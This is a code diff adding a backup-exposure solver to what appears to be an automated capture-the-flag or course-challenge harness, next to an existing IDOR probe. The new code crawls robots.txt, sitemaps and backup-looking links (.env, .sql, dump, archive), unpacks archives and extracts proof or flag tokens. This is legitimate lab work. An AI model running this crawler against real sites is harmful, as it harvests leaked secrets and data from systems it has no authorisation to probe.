@@ -173,13 +173,111 @@ def solve_idor(base):
     return best
 
 
+# ---- D01 backup exposure (compound: Mastery / live checks hand out an earlier day's target) -- ported from
+# day01/web-back-up-a-minute/solver: robots/sitemap/home links -> directory indexes -> backup files (archives unpacked)
+BPROOF_RE = re.compile(rb"proof_[A-Za-z0-9_\-]{6,}|flag\{[^}\s]{1,200}\}")
+BACKUP_RE = re.compile(r"\.(bak|old|orig|save|swp|tmp|backup|zip|tar|tgz|gz|7z|sql|json|env|txt|log|yml|yaml|conf|cfg|ini)"
+                       r"(\.[a-z0-9]+)?$|~$|backup|snapshot|archive|dump|env", re.I)
+
+
+def _bget(url, limit=4 << 20):
+    try:
+        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (hctf solver)"})
+        with urllib.request.urlopen(req, timeout=6) as r:
+            return r.read(limit)
+    except Exception:  # noqa: BLE001
+        return None
+
+
+def _unpack(b):
+    """Search texts of a body: itself plus members of zip / gzip / tar archives."""
+    import gzip
+    import io
+    import tarfile
+    import zipfile
+    out = [b]
+    try:
+        if b[:2] == b"PK":
+            from lib.common import read_member
+            z = zipfile.ZipFile(io.BytesIO(b))
+            for n in z.namelist():
+                try:
+                    out.append(z.read(n))
+                except RuntimeError:
+                    try:
+                        out.append(read_member(io.BytesIO(b), n))
+                    except Exception:  # noqa: BLE001
+                        pass
+        elif b[:2] == b"\x1f\x8b":
+            g = gzip.decompress(b)
+            out.append(g)
+            if len(g) > 262 and g[257:262] == b"ustar":
+                b = g
+        if len(b) > 262 and b[257:262] == b"ustar":
+            with tarfile.open(fileobj=io.BytesIO(b)) as t:
+                for m in t.getmembers():
+                    if m.isfile():
+                        out.append(t.extractfile(m).read())
+    except Exception:  # noqa: BLE001
+        pass
+    return out
+
+
+def _bproof(b):
+    for blob in _unpack(b or b""):
+        m = BPROOF_RE.search(blob)
+        if m:
+            return m.group(0).decode("latin-1")
+    return None
+
+
+def _blinks(base, body):
+    hrefs = re.findall(rb"""(?:href|src)\s*=\s*["']([^"'#]+)""", body or b"")
+    return [urllib.parse.urljoin(base, h.decode("latin-1")) for h in hrefs]
+
+
+def solve_backup(url):
+    """D01: follow what the site discloses (robots Disallow / sitemap / backup-looking links), depth-2 same origin;
+    the proof is the first `proof_...` token in a leaked file."""
+    base = url if url.endswith("/") else url + "/"
+    host = urllib.parse.urlsplit(base).netloc
+    robots = _bget(urllib.parse.urljoin(base, "/robots.txt")) or b""
+    paths = re.findall(rb"(?im)^\s*(?:dis)?allow\s*:\s*(\S+)", robots)
+    paths += re.findall(rb"(?im)^\s*sitemap\s*:\s*(\S+)", robots)
+    queue = [urllib.parse.urljoin(base, p.decode("latin-1").replace("*", "")) for p in paths if p.strip() != b"/"]
+    home = _bget(base) or b""
+    queue += [u for u in _blinks(base, home) if BACKUP_RE.search(urllib.parse.urlsplit(u).path)]
+    seen = {base}
+    while queue and len(seen) < 40:
+        u = queue.pop(0)
+        if u in seen or urllib.parse.urlsplit(u).netloc != host:
+            continue
+        seen.add(u)
+        body = _bget(u)
+        if not body:
+            continue
+        p = _bproof(body)
+        if p:
+            return p
+        if b"<a " in body or b"<loc>" in body:
+            for v in _blinks(u, body) + [x.decode("latin-1") for x in re.findall(rb"<loc>\s*([^<\s]+)", body)]:
+                if v not in seen and v.startswith(base.rstrip("/")) and urllib.parse.urlsplit(v).path not in ("", "/") \
+                        and not v.endswith((".css", ".svg", ".png", ".jpg", ".ico", ".woff2")):
+                    queue.append(v)
+    return _bproof(home)
+
+
 def answer(answer_id, question, data, contract):
     """Return the value for one answer_id from its artifact bytes (None = cannot answer). Derive everything from
     `data`; never hard-code a variant's values."""
     base = target_url(question, contract)
-    if base:
-        return solve_idor(base)
-    return None
+    if not base:
+        return None
+    # every known concept probe on every target (Mastery mixes earlier days' bugs in): IDOR, then D01 backup exposure
+    v = solve_idor(base)
+    if v is not None and PROOF_RE.fullmatch(str(v)):
+        return v
+    return solve_backup(base) or v
 
 
 def fallback(answer_id, question, data, contract):
